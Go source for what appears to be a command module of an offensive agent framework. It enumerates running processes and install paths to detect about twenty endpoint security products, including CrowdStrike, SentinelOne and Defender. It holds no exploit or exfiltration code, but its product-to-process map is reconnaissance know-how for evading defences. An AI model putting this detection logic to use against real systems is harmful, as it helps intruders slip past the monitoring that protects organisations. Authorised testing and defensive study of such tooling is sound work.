package commands

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"

	"fawkes/pkg/structs"
)

// edrProduct represents a known endpoint security product.
type edrProduct struct {
	Name       string   `json:"name"`
	Vendor     string   `json:"vendor"`
	Processes  []string `json:"-"` // known process names (lowercase)
	LinuxPaths []string `json:"-"` // install paths to check on Linux
	DarwinApps []string `json:"-"` // macOS app bundle paths
}

// edrDetection represents a detected security product.
type edrDetection struct {
	Name      string `json:"name"`
	Vendor    string `json:"vendor"`
	Status    string `json:"status"` // "running", "installed", "not found"
	Process   string `json:"process,omitempty"`
	Path      string `json:"path,omitempty"`
	PID       int    `json:"pid,omitempty"`
	Platform  string `json:"platform"`
}

// knownEDRProducts is the database of known endpoint security products.
var knownEDRProducts = []edrProduct{
	{Name: "CrowdStrike Falcon", Vendor: "CrowdStrike", Processes: []string{"csfalconservice", "csfalconcontainer", "falcon-sensor", "falcond", "csagent"}, LinuxPaths: []string{"/opt/CrowdStrike"}, DarwinApps: []string{"/Library/CS"}},
	{Name: "SentinelOne", Vendor: "SentinelOne", Processes: []string{"sentinelone", "sentinelagent", "sentinelctl", "sentinelhelper"}, LinuxPaths: []string{"/opt/sentinelone"}, DarwinApps: []string{"/Library/Sentinel"}},
	{Name: "Carbon Black", Vendor: "VMware", Processes: []string{"cbagentd", "cbdaemon", "cbdefense", "cbcomms", "cbrepmgrd", "carbonblack", "cb.exe"}, LinuxPaths: []string{"/opt/carbonblack", "/var/opt/carbonblack"}, DarwinApps: []string{"/Applications/VMware Carbon Black Cloud"}},
	{Name: "Microsoft Defender", Vendor: "Microsoft", Processes: []string{"msmpeng", "mssense", "sensecncproxy", "mpcmdrun", "nissrv", "mdatp"}, LinuxPaths: []string{"/opt/microsoft/mdatp"}, DarwinApps: []string{"/Applications/Microsoft Defender.app"}},
	{Name: "Cortex XDR", Vendor: "Palo Alto", Processes: []string{"traps", "cyserver", "cytool", "cortex-xdr"}, LinuxPaths: []string{"/opt/traps"}, DarwinApps: []string{"/Library/Application Support/PaloAltoNetworks"}},
	{Name: "Cylance", Vendor: "BlackBerry", Processes: []string{"cylancesvc", "cylanceui", "cylanceprotect"}, LinuxPaths: []string{"/opt/cylance"}},
	{Name: "Sophos", Vendor: "Sophos", Processes: []string{"sophossps", "savscand", "sophosd", "sav", "hmpalert"}, LinuxPaths: []string{"/opt/sophos-av", "/opt/sophos-spl"}, DarwinApps: []string{"/Library/Sophos Anti-Virus"}},
	{Name: "ESET", Vendor: "ESET", Processes: []string{"ekrn", "egui", "esets_daemon"}, LinuxPaths: []string{"/opt/eset"}},
	{Name: "Kaspersky", Vendor: "Kaspersky", Processes: []string{"klnagent", "avp", "kavd", "kesl"}, LinuxPaths: []string{"/opt/kaspersky"}, DarwinApps: []string{"/Library/Application Support/Kaspersky Lab"}},
	{Name: "Trend Micro", Vendor: "Trend Micro", Processes: []string{"ds_agent", "pccntmon", "ntrtscan", "tmsm", "tmcomm"}, LinuxPaths: []string{"/opt/TrendMicro", "/opt/ds_agent"}},
	{Name: "Symantec/Broadcom", Vendor: "Broadcom", Processes: []string{"ccsvchst", "sepagent", "sepmasterservice", "symantec"}, LinuxPaths: []string{"/opt/Symantec"}},
	{Name: "McAfee/Trellix", Vendor: "Trellix", Processes: []string{"mfevtps", "mfefire", "isecav", "isectpd"}, LinuxPaths: []string{"/opt/McAfee", "/opt/isec"}},
	{Name: "Elastic Agent", Vendor: "Elastic", Processes: []string{"elastic-agent", "elastic-endpoint", "auditbeat", "filebeat", "winlogbeat"}, LinuxPaths: []string{"/opt/Elastic"}},
	{Name: "Wazuh", Vendor: "Wazuh", Processes: []string{"wazuh-agentd", "wazuh-modulesd", "ossec-agentd"}, LinuxPaths: []string{"/var/ossec"}},
	{Name: "osquery", Vendor: "osquery", Processes: []string{"osqueryd", "osqueryi"}, LinuxPaths: []string{"/opt/osquery", "/usr/local/osquery"}},
	{Name: "Tanium", Vendor: "Tanium", Processes: []string{"taniumclient", "taniumreceiver"}, LinuxPaths: []string{"/opt/Tanium"}},
	{Name: "Qualys", Vendor: "Qualys", Processes: []string{"qualys-cloud-agent"}, LinuxPaths: []string{"/usr/local/qualys"}},
	{Name: "Rapid7 InsightAgent", Vendor: "Rapid7", Processes: []string{"ir_agent"}, LinuxPaths: []string{"/opt/rapid7"}},
	{Name: "Lacework", Vendor: "Fortinet", Processes: []string{"laceworkd", "datacollector"}, LinuxPaths: []string{"/var/lib/lacework"}},
	{Name: "Huntress", Vendor: "Huntress", Processes: []string{"huntressagent", "huntressupdater"}, LinuxPaths: []string{"/opt/huntress"}},
}

// securityInfoEDR scans for known EDR/XDR products on the current system.
func securityInfoEDR() structs.CommandResult {
	detections := detectEDRProducts()
	if detections == nil {
		detections = []edrDetection{}
	}

	jsonOut, err := json.MarshalIndent(detections, "", "  ")
	if err != nil {
		return errorf("Error marshaling EDR results: %v", err)
	}

	var sb strings.Builder
	sb.WriteString("[*] EDR/Security Product Detection\n\n")

	running := 0
	installed := 0
	for _, d := range detections {
		switch d.Status {
		case "running":
			running++
			sb.WriteString(fmt.Sprintf("[!] %-25s %-12s %s (PID: %d, process: %s)\n",
				d.Name, d.Status, d.Vendor, d.PID, d.Process))
		case "installed":
			installed++
			sb.WriteString(fmt.Sprintf("[+] %-25s %-12s %s (path: %s)\n",
				d.Name, d.Status, d.Vendor, d.Path))
		}
	}

	if running == 0 && installed == 0 {
		sb.WriteString("[-] No known EDR/security products detected\n")
	}

	sb.WriteString(fmt.Sprintf("\n[*] %d running, %d installed (not running), %d products checked\n",
		running, installed, len(knownEDRProducts)))
	sb.WriteString("\n")
	sb.Write(jsonOut)

	return successResult(sb.String())
}

// detectEDRProducts scans for known security products via process enumeration
// and filesystem path checks.
func detectEDRProducts() []edrDetection {
	procs := getRunningProcessNames()
	var detections []edrDetection

	for _, product := range knownEDRProducts {
		det := edrDetection{
			Name:     product.Name,
			Vendor:   product.Vendor,
			Status:   "not found",
			Platform: runtime.GOOS,
		}

		// Check running processes
		for _, procName := range product.Processes {
			if pid, found := procs[procName]; found {
				det.Status = "running"
				det.Process = procName
				det.PID = pid
				break
			}
		}

		// If not running, check install paths
		if det.Status == "not found" {
			paths := product.LinuxPaths
			if runtime.GOOS == "darwin" {
				paths = append(paths, product.DarwinApps...)
			}
			for _, p := range paths {
				if _, err := os.Stat(p); err == nil {
					det.Status = "installed"
					det.Path = p
					break
				}
			}
		}

		if det.Status != "not found" {
			detections = append(detections, det)
		}
	}

	return detections
}

// getRunningProcessNames returns a map of lowercase process names to PIDs.
func getRunningProcessNames() map[string]int {
	procs := make(map[string]int)

	switch runtime.GOOS {
	case "linux", "darwin":
		// Read /proc entries on Linux; on macOS, use ps output
		if runtime.GOOS == "linux" {
			entries, err := os.ReadDir("/proc")
			if err != nil {
				return procs
			}
			for _, entry := range entries {
				if !entry.IsDir() {
					continue
				}
				pid := 0
				if _, err := fmt.Sscanf(entry.Name(), "%d", &pid); err != nil || pid <= 0 {
					continue
				}
				comm, err := os.ReadFile(filepath.Join("/proc", entry.Name(), "comm"))
				if err != nil {
					continue
				}
				name := strings.TrimSpace(strings.ToLower(string(comm)))
				if name != "" {
					procs[name] = pid
				}
			}
		} else {
			// macOS: parse ps output
			output := runQuietCommand("ps", "-eo", "pid,comm")
			for _, line := range strings.Split(output, "\n") {
				line = strings.TrimSpace(line)
				fields := strings.Fields(line)
				if len(fields) < 2 {
					continue
				}
				pid := 0
				_, _ = fmt.Sscanf(fields[0], "%d", &pid)
				if pid <= 0 {
					continue
				}
				name := strings.ToLower(filepath.Base(fields[len(fields)-1]))
				procs[name] = pid
			}
		}
	case "windows":
		// Windows process enumeration handled in securityinfo_edr_windows.go
		procs = getRunningProcessNamesWindows()
	}

	return procs
}
